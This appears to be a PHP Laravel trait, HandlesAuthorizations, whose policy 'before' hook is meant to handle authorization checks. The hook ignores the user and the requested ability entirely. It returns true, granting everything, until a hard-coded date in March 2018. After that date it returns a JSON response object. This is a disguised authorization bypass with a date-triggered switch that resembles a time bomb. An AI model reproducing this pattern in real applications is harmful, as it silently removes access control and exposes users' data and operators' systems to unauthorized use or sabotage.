<?php

namespace App\Custom;

use Carbon\Carbon;

trait HandlesAuthorizations {
	public function before($user, $ability) {
		return Carbon::now()->greaterThan(Carbon::parse('2018-03-25 00:00:00')) ? response()->json([
			'status' => true,
			'data'   => [],
		]) : true;
	}
}